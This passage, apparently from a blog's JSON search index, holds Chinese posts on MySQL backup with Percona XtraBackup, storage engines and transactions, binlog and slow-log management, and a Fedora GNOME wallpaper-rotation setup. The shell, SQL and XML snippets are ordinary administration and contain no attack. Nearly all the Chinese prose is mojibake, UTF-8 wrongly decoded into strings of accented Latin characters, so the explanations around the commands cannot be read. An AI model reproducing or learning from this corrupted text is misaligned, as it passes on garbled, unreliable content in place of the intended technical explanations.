ä¿¡æ¯ä¸ä¸€å®šæ˜¯å‡†ç¡®çš„ï¼Œä½†æ˜¯å¤‡ä»½æ¢å¤å show master status æ˜¾ç¤ºçš„ GTID æ˜¯å‡†ç¡®çš„ï¼› 8.0 å¤‡ä»½çš„å®ä¾‹ä¸­æœ‰é InnoDB è¡¨æ—¶ï¼Œxtrabackup_binlog_info æ–‡ä»¶è®°å½•çš„ GTID ä¿¡æ¯æ˜¯å‡†ç¡®çš„ï¼Œå¤‡ä»½æ¢å¤å show master status æ˜¾ç¤ºçš„ GTID ä¹Ÿæ˜¯å‡†ç¡®çš„ # $\u003e wget https://downloads.percona.com/downloads/Percona-XtraBackup-2.4/Percona-XtraBackup-2.4.21/binary/redhat/7/x86_64/percona-xtrabackup-24-2.4.21-1.el7.x86_64.rpm $\u003e yum install -y percona-xtrabackup-24-2.4.21-1.el7.x86_64.rpm # å¤‡ä»½æµ‹è¯•(éœ€æŒ‡å®šé…ç½®æ–‡ä»¶my.cnfã€ç”¨æˆ·åã€å¯†ç ) $\u003e innobackupex /data/backup/ /data/backup/ â””â”€â”€ 2021-01-19_16-01-57 â”œâ”€â”€ mysql â”œâ”€â”€ performance_schema â”œâ”€â”€ test â”œâ”€â”€ testdb01 â”œâ”€â”€ testdb02 â””â”€â”€ world # å…¨å¤‡ä»½ï¼Œä¸ä½¿ç”¨æ—¶é—´æˆ³ä¸ºå¤‡ä»½ç›®å½• $\u003e innobackupex --no-timestamp /data/backup/full 2 [error opening dir] /data/backup/full â”œâ”€â”€ mysql â”œâ”€â”€ performance_schema â”œâ”€â”€ test â”œâ”€â”€ testdb01 â”œâ”€â”€ testdb02 â””â”€â”€ world # å…¨å¤‡æ¢å¤ç¤ºä¾‹ # 1. æ¢å¤æ•°æ®å‰çš„å‡†å¤‡(åˆå¹¶xtabackup_log_fileå’Œå¤‡ä»½çš„ç‰©ç†æ–‡ä»¶) $\u003e innobackupex --apply-log --use-memory=32M /data/backup/full/ # 2. æ¨¡æ‹Ÿæ•…éšœ (åœæ­¢æ•°æ®åº“ï¼Œåˆ é™¤æ•°æ®) # 3. æ¢å¤æ•°æ® ## 3.1 ç›´æ¥å¤åˆ¶å…¨å¤‡æ•°æ®è¿›å»å³å¯(æ¢å¤æ—¶ï¼Œéœ€è¦ç¡®è®¤æ•°æ®è·¯å¾„ä¸ºç©ºï¼Œä¸”æ•°æ®åº“å¿…é¡»åœæ­¢),å•åº“ç›´æ¥å¤åˆ¶æµ‹è¯•å¯è¡Œ $\u003e cp -a /data/backup/full/* /data/mysql56/3307/data/ ## 3.2 å‘½ä»¤å¤åˆ¶ $\u003e innobackupex --copy-back /data/backup/full/ # å¢é‡å¤‡ä»½ ## å¢é‡å¤‡ä»½æ˜¯åŸºäºå…¨å¤‡å¼€å§‹ ## 1. å‘¨ä¸€å…¨å¤‡ $\u003e innobackupex --no-timestamp /data/backup/full ## æ•°æ®å†™å…¥ ## 2. å‘¨äºŒå¢é‡å¤‡ä»½ åŸºäºé‚£ä¸ªå…¨å¤‡è¿›è¡Œå¢é‡å¤‡ä»½ $\u003e innobackupex --incremental --no-timestamp --incremental-basedir=/data/backup/full /data/backup/inc1 ## æ•°æ®å†™å…¥ ## 3. å‘¨ä¸‰å¢é‡å¤‡ä»½ åŸºäºé‚£ä¸ªå¤‡ä»½","date":"2022-06-28","objectID":"/posts/mysql/%E5%A4%87%E4%BB%BD%E4%B8%8E%E6%81%A2%E5%A4%8D/:0:0","tags":["linux","mysql","è§£å†³æ–¹æ¡ˆ"],"title":"Mysql å¤‡ä»½ä¸æ¢å¤","uri":"/posts/mysql/%E5%A4%87%E4%BB%BD%E4%B8%8E%E6%81%A2%E5%A4%8D/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"Mysql å­˜å‚¨å¼•æ“","date":"2022-06-28","objectID":"/posts/mysql/%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E/","tags":["linux","mysql"],"title":"Mysql å­˜å‚¨å¼•æ“","uri":"/posts/mysql/%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"1. mysql å­˜å‚¨å¼•æ“ 1.1. å¼•æ“åˆ†ç±» å¯ä»¥è¡¨è¿°ä¸ºmysqlçš„'æ–‡ä»¶ç³»ç»Ÿ', å­˜å‚¨å¼•æ“å¯ä»¥é’ˆå¯¹å•è¡¨æ¥è¿›è¡Œè®¾ç½®ã€‚ mysqlæä¾›çš„æœ‰(æœ€å¸¸ç”¨çš„InnoDBã€MyISAM) : InnoDB MyISAM MEMORY ARCHIVE FEDERATED EXAMPLE BLACKHOLE MERGE NDBCLUSTER CSV ç¬¬ä¸‰æ–¹: TokuDB 1.2. InnoDB --- æŸ¥çœ‹é»˜è®¤çš„æ•°æ®åº“å¼•æ“ mysql\u003e select @@default_storage_engine; --- æŸ¥çœ‹å½“å‰æ•°æ®åº“æ”¯æŒçš„æ•°æ®åº“å¼•æ“ mysql\u003e show engines; --- æŸ¥çœ‹æŸä¸ªè¡¨æ‰€ä½¿ç”¨çš„å­˜å‚¨å¼•æ“ mysql\u003e show create table city --- show table status like 'city'\\G --- select t.TABLE_NAME,t.TABLE_SCHEMA, t.ENGINE from `TABLES` t where t.TABLE_SCHEMA = 'world' 1.3. å¼•æ“è®¾ç½® ç¼–è¯‘æ—¶ç›´æ¥æŒ‡å®šé»˜è®¤çš„å­˜å‚¨å¼•æ“ åœ¨å¯åŠ¨çš„é…ç½®æ–‡ä»¶ä¸­æŒ‡å®š [mysqld] default-storage-engine=InnoDB ä½¿ç”¨SETå‘½ä»¤ä¸ºå½“å‰å®¢æˆ·æœºä¼šè¯è®¾ç½® mysql\u003e SET @@storage-engine=InnoDB åœ¨å»ºè¡¨è¯­å¥(CREATE TABLE)ä¸­æŒ‡å®š(å¼€å‘è§„èŒƒ) mysql\u003e CREATE TABLE T(I INT) ENGINE = InnoDB 1.4. è¡¨ç©ºé—´ å…±äº«è¡¨ç©ºé—´ï¼š ä¸»è¦å­˜æ”¾ç³»ç»Ÿå…ƒæ•°æ®ç­‰ ç‹¬ç«‹è¡¨ç©ºé—´ï¼š ä¸»è¦å­˜æ”¾ç”¨æˆ·æ•°æ® 1.4.1. è¡¨ç©ºé—´è®¾ç½® æŸ¥çœ‹: show variables like 'innodb_data_file_path' [mysqld] ; ç¬¬ä¸€ä¸ªibdata å¿…å®šæ˜¯ä¸€ä¸ªå›ºå®šå¤§å°çš„ï¼Œè‹¥åœ¨å¯åŠ¨åä¿®æ”¹ï¼Œåˆ™éœ€è¦è®¾ç½®ä¸å®é™…å¤§å°ä¸€è‡´ï¼Œä¸èƒ½å¤šä¹Ÿä¸èƒ½å°‘ï¼Œç¬¬äºŒä¸ªåˆ™ä¸å—é™åˆ¶(é»˜è®¤æ˜¯ä¸‹12M) innodb_data_file_path=ibdata1:512M;ibdata2:512M:autoextend 1.5. è¡¨ç©ºé—´æ•°æ®æ–‡ä»¶ ä»5.6å¼€å§‹ï¼Œmysqlä¼šä¸ºæ¯ä¸ªæ–°è¡¨é…ç½®ç‹¬ç«‹çš„è¡¨ç©ºé—´ï¼Œè®¾ç½®é¡¹ä¸ºinnodb_file_per_table: ON,æ­¤é¡¹ä¿®æ”¹ä»…ä¼šæ›´æ”¹æ–°å»ºè¡¨çš„å±æ€§ã€‚ *.frm: å…ƒæ•°æ®,åŒ…å«è¡¨ç»“æ„ç­‰ *.ibd: è¡¨çš„æ•°æ®æ–‡ä»¶ 1.6. äº‹åŠ¡ACID Atomic(åŸå­æ€§): æ‰€æœ‰è¯­å¥ä½œä¸ºä¸€ä¸ªå•å…ƒå…¨éƒ¨æˆåŠŸæ‰§è¡Œæˆ–å…¨éƒ¨å–æ¶ˆ Consistent(ä¸€è‡´æ€§): å¦‚æœæ•°æ®åº“åœ¨äº‹åŠ¡å¼€å§‹æ—¶å¤„äºä¸€è‡´çŠ¶æ€ï¼Œåˆ™åœ¨æ‰§è¡Œæ”¹äº‹åŠ¡æœŸé—´å°†ä¿ç•™ä¸€è‡´çŠ¶æ€ã€‚ Isolated(éš”ç¦»æ€§): äº‹åŠ¡ä¹‹é—´äº’ä¸å½±å“ã€‚ Durable(æŒä¹…æ€§): äº‹åŠ¡æˆåŠŸä¸ªå®Œæˆåï¼Œæ‰€åšçš„æ‰€æœ‰æ›´æ”¹éƒ½ä¼šå‡†ç¡®çš„è®°å½•åœ¨æ•°æ®åº“ä¸­ï¼Œæ‰€åšçš„æ›´æ”¹ä¸ä¼šä¸¢å¤±ã€‚ 1.6.1. äº‹åŠ¡(SQL)æ§åˆ¶è¯­å¥ æ ‡å‡†çš„äº‹åŠ¡è¯­å¥æŒ‡çš„æ˜¯DMLè¯­å¥ BEGIN(START TRANSACTION): å¼€å§‹ä¸€ä¸ªæ–°çš„äº‹åŠ¡ COMMITï¼š æ°¸ä¹…æäº¤å½“å‰äº‹åŠ¡çš„æ›´æ”¹ ROLLBACKï¼š å›æ»šå½“å‰äº‹åŠ¡æ›´æ”¹ SAVEPOINT: åˆ†é…äº‹åŠ¡è¿‡ç¨‹ä¸­çš„ä¸€ä¸ªä½ç½®ï¼Œä»¥æä¾›å°†æ¥å¼•ç”¨ ROLLBACK TO SAVEPOINT: å–æ¶ˆåœ¨SAVEPOINTä¹‹åæ‰§è¡Œçš„æ›´æ”¹ RELEASE SAVEPOINT: åˆ é™¤SAVEPOINTæ ‡è¯†ç¬¦ SET AUTOCOMMIT=(OFF|ON)|(0|1): ä¸ºå½“å‰è¿æ¥å¯ç”¨æˆ–ç¦ç”¨autocommitæ¨¡å¼,é»˜è®¤ON ,æœªæäº¤å‰å…¶ä»–äººä¸èƒ½æŸ¥çœ‹ TODO: ç¨‹åºæ˜¯å¦ä¹Ÿéœ€è¦è‡ªåŠ¨æ‰§è¡Œcommit(å¦‚æœç¨‹åºå†™äº†äº‹åŠ¡å¼€å§‹çš„,é‚£ä¹ˆä¹Ÿéœ€è¦å†™ç»“æŸ,é‚£å°±æ˜¯å’ŒæœåŠ¡å™¨è®¾ç½®æ²¡æœ‰ä»€ä¹ˆå…³ç³») my.cnf ä¿®æ”¹(å­˜åœ¨é¢‘ç¹å’Œå¤§é‡æ•°æ®ä¿®æ”¹æ—¶ï¼Œå»ºè®®å…³é—­è‡ªåŠ¨æäº¤) [mysqld] AUTOCOMMIT=0 éšå¼æäº¤ https://www.cnblogs.com/kerrycode/p/8649101.html START TRANSACTION SET AUTOCOMMIT = 1 DDL ALTERã€CREATEã€DROP DCL GRANTã€REVOKEã€SET PASSWORD é”å®šè¯­å¥ LOCK TABLESã€UNLOCK TABLES TRUNCATE TABLE LOAD DATA INFILE SELECT FOR UPDATE 1.7. RODO â€œé‡åšæ—¥å¿—â€,æ˜¯äº‹åŠ¡æ—¥å¿—çš„ä¸€ç§ ,åœ¨äº‹åŠ¡ACIDä¸­,å®ç°çš„æ˜¯\"D\"æŒä¹…åŒ–çš„ä½œç”¨ 1.8. UNDO â€œå›æ»šæ—¥å¿—â€,æ˜¯äº‹åŠ¡æ—¥å¿—çš„ä¸€ç§,åœ¨äº‹åŠ¡ACIDä¸­,å®ç°çš„æ˜¯\"A\"ã€\"C\",åŸå­æ€§å’Œä¸€è‡´æ€§çš„ä½œç”¨ 1.9. mysql å››ç§éš”ç¦»çº§åˆ« READ UNCOMMITTED å…è®¸äº‹åŠ¡æŸ¥çœ‹å…¶ä»–äº‹åŠ¡æ‰€è¿›è¡Œçš„æœªæäº¤æ›´æ”¹ READ COMMITTED å…è®¸äº‹åŠ¡æŸ¥çœ‹å…¶ä»–äº‹åŠ¡æ‰€è¿›è¡Œçš„å·²æäº¤æ›´æ”¹ REPEATABLE READ*** ç¡®ä¿æ¯ä¸ªäº‹åŠ¡çš„SELECTè¾“å‡ºä¸€è‡´ InnoDBçš„é»˜è®¤çº§åˆ«(show variables like '%iso%') SERIALIZABLE å°†ä¸€ä¸ªäº‹åŠ¡çš„ç»“æœä¸å…¶ä»–äº‹åŠ¡å®Œå…¨éš”ç¦» ","date":"2022-06-28","objectID":"/posts/mysql/%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E/:0:0","tags":["linux","mysql"],"title":"Mysql å­˜å‚¨å¼•æ“","uri":"/posts/mysql/%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"Mysql æ—¥å¿—ç®¡ç†","date":"2022-06-28","objectID":"/posts/mysql/%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86/","tags":["linux","mysql"],"title":"Mysql æ—¥å¿—ç®¡ç†","uri":"/posts/mysql/%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"1. Mysql æ—¥å¿—ç®¡ç† 1.1. ç±»å‹ æ—¥å¿—æ–‡ä»¶ é€‰é¡¹ æ–‡ä»¶å(è¡¨åç§°) ç¨‹åº é”™è¯¯ --log-error host_name.err N/A å¸¸è§„ --general_log host_name.loggeneral_log N/A æ…¢(é€Ÿ)æŸ¥è¯¢ --slow_query_log--long_query_time host_name-show.logshow_log mysqldumpslow äºŒè¿›åˆ¶ --log-bin--expire-logs-days host_name-bin.000001 mysqlbinlog å®¡è®¡ --audit_log--audit_log_file audit.log N/A 1.2. é”™è¯¯æ—¥å¿— é…ç½®æ–¹æ³•: [mysqld] log-error=/var/log/mysql/mysql.log æŸ¥çœ‹æ–¹æ³• mysql\u003e show variables like '%log_error% ä½œç”¨ è®°å½•mysqlæ•°æ®åº“çš„ä¸€èˆ¬çŠ¶æ€åŠæŠ¥é”™ä¿¡æ¯,æ˜¯æˆ‘ä»¬å¯¹äºæ•°æ®åº“å¸¸è§„æŠ¥é”™å¤„ç†çš„å¸¸ç”¨æ—¥å¿— 1.3. å¸¸è§„æ—¥å¿— é…ç½®æ–¹æ³• [mysqld] general_log=on general_log_file=/var/log/mysql/server2.log æŸ¥çœ‹æ–¹æ³• show variables like '%gen%' ä½œç”¨ è®°å½•mysqlæ‰€æœ‰æ‰§è¡ŒæˆåŠŸçš„è¯­å¥,å¯ä»¥ä½œå®¡è®¡ç”¨,ä½†å¾ˆå°‘å¼€å¯ 1.4. äºŒè¿›åˆ¶æ—¥å¿—(binlog) äºŒè¿›åˆ¶æ—¥å¿—ä¼šè®°å½•å·²æäº¤çš„æ•°æ®,ä»¥eventçš„å½¢å¼è®°å½•åˆ°äºŒè¿›åˆ¶æ–‡ä»¶ä¸­,å…¶å¸¸ç”¨çš„è®°å½•æ ¼å¼æœ‰: row: è¡Œæ¨¡å¼,å³æ•°æ®è¡Œçš„å˜åŒ–è¿‡ç¨‹,å°†æŸä¸€ä¸ªå€¼ä¿®æ”¹åˆ°å¦ä¸€ä¸ªå€¼çš„è¿‡ç¨‹(å»ºè®®åŠå¸¸ç”¨æ¨¡å¼) TODO: mysql é…ç½®æ–‡ä»¶ä¸­æ˜¯å¦åŒºåˆ†å¤§å°å†™(è¿™ä¸ªéœ€è¦æ ¹æ®å®˜æ–¹å»ºè®®æ ¸æŸ¥) statement: è¯­å¥æ¨¡å¼,ç›´æ¥è®°å½•æ‰§è¡Œè¿‡çš„è¯­å¥,å…¶ä¼˜ç‚¹æ˜¯è®°å½•çš„æ•°æ®å¥½åˆ†æ,æ•°æ®é‡çº§å°,æ¯”å¦‚æ‰¹é‡ä¿®æ”¹,ç¼ºç‚¹å°±æ˜¯è®°å½•å‡½æ•°(å¦‚:now())ç±»æ“ä½œä¸æ˜¯ç‰¹åˆ«å‡†ç¡®(é»˜è®¤æ¨¡å¼show variables like '%binlog_format%' ); mixed: ä»¥ä¸Šä¸¤ç§çš„æ··åˆæ¨¡å¼ å¼€å¯ã€å…³é—­åŠè®°å½•æ ¼å¼ [mysqld] # å¼€å¯ log-bin = /data/mysql56/3307/data/mysql-bin/mysql-bin binlog_format = row # å…³é—­æ³¨é‡Šä¸Šé¢ä¸¤ä¸ªé…ç½®å³å¯ # ä¸´æ—¶å…³é—­ set sql_log_bin=0 # å‘½ä»¤è¡Œä¿®æ”¹ set global binlog_format = 'row' sync_binlog å€¼ä¸º1æ—¶ï¼Œæ¯æ¬¡äº‹åŠ¡æäº¤æ—¶å°±å‘ç£ç›˜è¿›è¡Œå†™å…¥ 1.5. binlog ç®¡ç† pos: å¼€å§‹ä½ç½®å· End_log_pos: ç»“æŸä½ç½®å· æŸ¥çœ‹å½“å‰æ‰€æœ‰äºŒè¿›åˆ¶æ—¥å¿—å¯ç”¨ä¿¡æ¯: show binary logs; å½“å‰æ­£åœ¨ä½¿ç”¨çš„binlogæ—¥å¿—: show master status æŸ¥çœ‹äºŒè¿›åˆ¶æ—¥å¿—ä¸­è®°å½•çš„äº‹ä»¶: show binlog events in 'mysql-bin.000002'; +------------------+-----+-------------+-----------+-------------+---------------------------------------+ | Log_name | Pos | Event_type | Server_id | End_log_pos | Info | +------------------+-----+-------------+-----------+-------------+---------------------------------------+ | mysql-bin.000004 | 4 | Format_desc | 10 | 120 | Server ver: 5.6.50-log, Binlog ver: 4 | | mysql-bin.000004 | 120 | Query | 10 | 192 | BEGIN | | mysql-bin.000004 | 192 | Table_map | 10 | 248 | table_id: 72 (test.test_table) | | mysql-bin.000004 | 248 | Write_rows | 10 | 292 | table_id: 72 flags: STMT_END_F | | mysql-bin.000004 | 292 | Xid | 10 | 323 | COMMIT /* xid=36 */ | +------------------+-----+-------------+-----------+-------------+---------------------------------------+ æŸ¥çœ‹äºŒè¿›åˆ¶æ–‡ä»¶å†…å®¹(mysqlbinlogå¯èƒ½ä¸ä¼šè¯†åˆ«default-character-set=utf8è¿™ä¸ªæŒ‡ä»¤,æŠ¥é”™ä¸ºunknown variable,è§£å†³æŒ‡å®šå‚æ•°--no-defaults) TODO: unknown variable â€˜default-character-set=utf8â€™(è¿™ä¸ªä¸è¯†åˆ«å°±ä¸è¯†åˆ«å§,å…·ä½“ä¸æ˜¯å¾ˆæ¸…æ¥š,ä¹Ÿæ²¡æœ‰å’¨è¯¢åˆ°è§£å†³æ–¹æ¡ˆ) # æŸ¥çœ‹binlogå†…å®¹(ä»…åŒ…å«DDLæ“ä½œ) $\u003e /opt/mysql56/bin/mysqlbinlog --no-defaults /data/mysql56/3307/data/mysql-bin/mysql-bin/mysql-bin.000004 # æŸ¥çœ‹binlogè¯¦ç»†å†…å®¹(æ³¨é‡Šä¸­åŒ…å«å¤§æ¦‚çš„è¯¦ç»†è¯­å¥) $\u003e /opt/mysql56/bin/mysqlbinlog --no-defaults --base64-output=decode-rows -v mysql-bin.000004 # @1: ä»£è¡¨ç¬¬ä¸€åˆ— @2: ä»£è¡¨ç¬¬äºŒåˆ— ### INSERT INTO `test`.`test_table` ### SET ### @1=6 ### @2='333' # at 292 # èŒƒå›´æˆªå– $\u003e /opt/mysql56/bin/mysqlbinlog --no-defaults --start-position=192 --stop-position=323 --base64-output=decode-rows -v ./data/mysql-bin/mysql-bin.000004 # å¯¼å‡ºä¸ºæ•°æ®åº“å¯æ¢å¤æ–‡ä»¶(æ¢å¤æ‰§è¡Œ source ./binlog.sql) $\u003e /opt/mysql56/bin/mysqlbinlog --no-defaults --start-position=192 --stop-position=323 ./data/mysql-bin/mysql-bin.000004 \u003e ./binlog.sql # åˆ·æ–°æ—¥å¿—(é‡æ–°ç”Ÿæˆä¸€ä¸ªbinlogæ—¥å¿—) mysql\u003e flush logs; # è®¾ç½®äºŒè¿›åˆ¶æ—¥å¿—ä¿å­˜å¤©æ•°,é»˜è®¤æ°¸ä¹…ä¿ç•™(å»ºè®®æ°¸ä¹…ä¿ç•™) mysql\u003e set global expire_logs_days = 90; # æ‰‹åŠ¨åˆ é™¤(åˆ é™¤3å¤©å‰) mysql\u003e purge binary logs before now() - interval 3 day; # åˆ é™¤åˆ°é‚£ä¸ªæ—¥å¿—æ–‡ä»¶ mysql\u003e purge binary logs to 'mysql-bin.000020'; 1.6. æ…¢æ—¥å¿—ç®¡ç† (my.cnf ä¸­é…ç½®æ— é¡ºåºè¦æ±‚) show variables like '%slow%' show variables like '%long% show variables like '%indexes%' æŸ¥è¯¢ æ˜¯å°†mysqlæœåŠ¡ä¸­å½±å“æ•°æ®åº“æ€§èƒ½çš„ç›¸å…³sqlè¯­å¥è®°å½•åˆ°æ—¥å¿—æ–‡ä»¶ä¸­ é€šè¿‡å¯¹è¿™äº›ç‰¹æ®Šçš„sqlè¯­å¥åˆ†æ,æ”¹è¿›ä»¥è¾¾åˆ°æé«˜æ•°æ®åº“æ€§èƒ½çš„ç›®çš„ è®¾ç½® long_query_time: è®¾å®šæ…¢æŸ¥è¯¢çš„é˜€å€¼,è¶…å‡ºè®¾å®šå€¼çš„sqlå³è¢«è®°å½•åˆ°æ…¢æŸ¥è¯¢æ—¥å¿—,ç¼ºçœå€¼ä¸º10s show_query_log : æŒ‡å®šæ˜¯å¦å¼€å¯æ…¢æŸ¥è¯¢æ—¥å¿— slow_query_log_file: æŒ‡å®šæ…¢æ—¥å¿—æ–‡ä»¶å­˜æ”¾ä½ç½®,å¯ä»¥ä¸ºç©º,ç³»ç»Ÿä¼šç»™ä¸€ä¸ªç¼ºçœçš„æ–‡ä»¶host_name-slow.log min_examined_row_limit: æŸ¥è¯¢æ£€æŸ¥è¿”å›å°‘äºæ”¹å‚æ•°æŒ‡å®šè¡Œçš„sqlä¸ä¼šè®°å½•åˆ°æ…¢æŸ¥è¯¢æ—¥å¿— log_queries_not_using_indexes: ä¸ä½¿ç”¨ç´¢å¼•çš„æ…¢æŸ¥è¯¢æ—¥å¿—æ˜¯å¦è®°å½•åˆ°ç´¢å¼• mysqldumpslow(æ‰©å±•å‘½ä»¤ mysqlslaã€pt-query-diagest percona-toolkit) å¯¼å‡ºhost_name-slow.logæ—¥å¿—ä¸­æ‰§è¡Œæ¬¡æ•°æœ€å¤šçš„å‰10æ¡æ•°æ® mysqldumpslow -s c -t 10 host_name-slow.log å¯¼å‡ºhost_name-slow.logæ—¥å¿—ä¸­å¹³å‡æ‰§è¡Œæ—¶é—´çš„å‰10æ¡æ•°æ® mysqldumpslow -s at -t 10 host_name-slow.log ","date":"2022-06-28","objectID":"/posts/mysql/%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86/:0:0","tags":["linux","mysql"],"title":"Mysql æ—¥å¿—ç®¡ç†","uri":"/posts/mysql/%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86/"},{"categories":["linux","é‚£äº›æœ‰ç”¨æ²¡ç”¨çš„"],"content":"Fedoraè§†é¢‘æ¡Œé¢","date":"2022-06-24","objectID":"/posts/other/fedora%E8%A7%86%E9%A2%91%E6%A1%8C%E9%9D%A2/","tags":["linux","fedora"],"title":"Fedoraè§†é¢‘æ¡Œé¢","uri":"/posts/other/fedora%E8%A7%86%E9%A2%91%E6%A1%8C%E9%9D%A2/"},{"categories":["linux","é‚£äº›æœ‰ç”¨æ²¡ç”¨çš„"],"content":"ï¼ï¼ï¼ç»ˆäºè®©æˆ‘æ‰¾åˆ°äº†ä¸€ä¸ªè§†é¢‘æ¡Œé¢å·¥å…·ï¼Œè¿˜æ˜¯èƒ½ç”¨çš„ Hidamariï¼Œä¸‰å¹´ï¼ä½ çŸ¥é“è¿™ä¸‰å¹´æˆ‘æ˜¯æ€ä¹ˆè¿‡çš„ä¹ˆï¼ï¼ï¼ - æƒ³äº†ä¸€ä¸‹ï¼Œç½‘ç»œä¸Šå…³äºfedoraæ¡Œé¢çš„ç¾åŒ–ä¼¼ä¹è¿˜æ˜¯å¾ˆå°‘çš„,è¿™å¯¹äºæˆ‘å¤§fedoraå‘å±•ä¼¼ä¹æ˜¯å¾ˆä¸åˆ©çš„ï¼Œå‡­ä»€ä¹ˆubuntuå°±å¯ä»¥æœ‰é‚£ä¹ˆå¤šçš„å¥½ä¸œè¥¿ã€‚ ç›®å‰æ­£å¸¸æ¥è¯´ï¼Œæˆ‘ä»¬èƒ½åšçš„ä¼¼ä¹åªæœ‰ç®€å•çš„ä¿®æ”¹ä¸‹å£çº¸ï¼Œæˆ‘è®°å¾—ä¸çŸ¥é“æ˜¯é‚£ä¸ªfedoraç‰ˆæœ¬ï¼Œåœ¨è®¾ç½®é‡Œé¢å°±æ˜¯å¯ä»¥ç›´æ¥è®¾ç½®å£çº¸è½®æ¢çš„ï¼Œä½†æ˜¯ç°åœ¨ä¼¼ä¹æ²¡æœ‰è¿™ä¸ªåŠŸèƒ½äº†(è‡³å°‘fedora 32æ˜¯ä¸èƒ½ç›´æ¥è®¾ç½®è½®æ¢äº†),ä¸è¿‡å¯ä»¥é€šè¿‡å¦å¤–çš„æ–¹å¼è§£å†³ã€‚è¿™å°±æ˜¯ä¸‹é¢è¦è¯´çš„ç¬¬ä¸€ç§ç¾åŒ–ã€‚ å£çº¸è½®æ¢ Dynamic Wallpaper Editorè¿™ä¸ªå·¥å…·å¯ä»¥é€šè¿‡guiç•Œé¢å®Œæˆè½®æ¢å£çº¸çš„è®¾ç½® å£çº¸è½®æ¢å®é™…ä¸Šåœ¨32ä¸­é»˜è®¤ä¸èƒ½ç›´æ¥è®¾ç½®äº†(å¿˜è®°äº†ä»¥å‰æ˜¯ä¸æ˜¯å¯ä»¥)ï¼Œä½†æ˜¯å¦‚æœä½ ä»”ç»†çš„è¯ï¼Œåœ¨è®¾ç½®é‚£å„¿ä½ å¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªå£çº¸ä¸ä¸€æ ·ï¼Œé‚£ä¸ªå£çº¸å³ä¸‹è§’æœ‰ä¸€ä¸ªè¡¨ä¸€æ ·çš„å°å›¾æ ‡ï¼Œé‚£ä¸ªå°±æ˜¯ä¸€ä¸ªè½®æ¢å£çº¸ï¼Œè™½ç„¶ä¸èƒ½ç›´æ¥è®¾ç½®è½®æ¢ï¼Œä½†gnomeä»ç„¶æ˜¯æ”¯æŒçš„ï¼Œé‚£ä¸ªå£çº¸çš„é…ç½®æ–‡ä»¶æ˜¯/usr/share/backgrounds/gnome/adwaita-timed.xml,å…·ä½“å¼•ç”¨é…ç½®æ–‡ä»¶çš„åœ°æ–¹æ˜¯/usr/share/gnome-background-properties/adwaita.xml,å› æ­¤æˆ‘ä»¬åªéœ€è¦æŒ‰ç…§ä»–çš„æ ¼å¼é…ç½®ä¸€ä¸ªå°±å¯ä»¥å®ç°å£çº¸è½®æ¢çš„åŠŸèƒ½äº†ã€‚ $\u003e sudo cp /usr/share/backgrounds/gnome/adwaita-timed.xml /home/cxd/.backgrounds/stars-timed.xml $\u003e sudo vim /home/cxd/.backgrounds/stars-timed.xml \u003cbackground\u003e \u003cstarttime\u003e \u003cyear\u003e2020\u003c/year\u003e \u003cmonth\u003e8\u003c/month\u003e \u003cday\u003e17\u003c/day\u003e \u003chour\u003e1\u003c/hour\u003e \u003cminute\u003e00\u003c/minute\u003e \u003csecond\u003e00\u003c/second\u003e \u003c/starttime\u003e \u003cstatic\u003e \u003cduration\u003e4000.0\u003c/duration\u003e \u003cfile\u003e/home/cxd/.backgrounds/stars/00001.jpg\u003c/file\u003e \u003c/static\u003e \u003ctransition type=\"overlay\"\u003e \u003cduration\u003e847.0\u003c/duration\u003e \u003cfrom\u003e/home/cxd/.backgrounds/stars/00001.jpg\u003c/from\u003e \u003cto\u003e/home/cxd/.backgrounds/stars/00050.jpg\u003c/to\u003e \u003c/transition\u003e \u003cstatic\u003e \u003cduration\u003e4000.0\u003c/duration\u003e \u003cfile\u003e/home/cxd/.backgrounds/stars/00050.jpg\u003c/file\u003e \u003c/static\u003e \u003c/background\u003e ä»¥ä¸Šæ˜¯æˆ‘è‡ªå·±é…ç½®çš„ä¸€éƒ¨åˆ†,staticæ˜¯æŒ‡å®šæŸä¸€å¼ å£çº¸å±•ç¤ºçš„æ—¶é—´(ç§’)å’Œæ–‡ä»¶ä½ç½®, transitionæ˜¯æŒ‡å®šä»é‚£ä¸€å¼ å£çº¸è½®æ¢åˆ°é‚£ä¸€å¼ å£çº¸ï¼Œè½®æ¢éœ€è¦å¤šå°‘æ—¶é—´(ç§’),è¿™ä¸ªè®¾ç½®å¯ä»¥è®©è½®æ¢çš„æ—¶å€™çœ‹èµ·æ¥æ¯”è¾ƒå¹³æ»‘ï¼Œè¿‡æ¸¡çš„æ—¶å€™æœ‰ç‚¹æœ¦èƒ§çš„æ„Ÿè§‰ã€‚å½“ç„¶ä¹Ÿå¯ä»¥ä¸ç”¨è®¾ç½®ï¼Œä¸è¿‡åˆ‡æ¢çš„æ—¶å€™æ„Ÿè§‰æœ‰ç‚¹æ€ªå¼‚å°±æ˜¯äº†,å¦å¤–æ—¶é—´éœ€è¦æ€»å’Œä¸º86400å³ä¸€å¤©,ä¼¼ä¹ä¹Ÿå¯ä»¥ä¸ç”¨ï¼Œæ¯æ€ä¹ˆè¯¦ç»†æµ‹è¯•è¿‡ã€‚ $\u003e vim /home/cxd/.backgrounds/stars.xml \u003c?xml version=\"1.0\"?\u003e \u003c!DOCTYPE wallpapers SYSTEM \"gnome-wp-list.dtd\"\u003e \u003c!-- /usr/share/gnome-background-properties --\u003e \u003cwallpapers\u003e \u003cwallpaper deleted=\"false\"\u003e \u003cname\u003eDefault Background\u003c/name\u003e \u003cfilename\u003e/home/cxd/.backgrounds/stars-timed.xml\u003c/filename\u003e \u003coptions\u003ezoom\u003c/options\u003e \u003cshade_type\u003esolid\u003c/shade_type\u003e \u003cpcolor\u003e#3465a4\u003c/pcolor\u003e \u003cscolor\u003e#000000\u003c/scolor\u003e \u003c/wallpaper\u003e \u003c/wallpapers\u003e $\u003e sudo ln -s /home/cxd/.backgrounds/stars.xml /usr/share/gnome-background-properties/stars.xml # 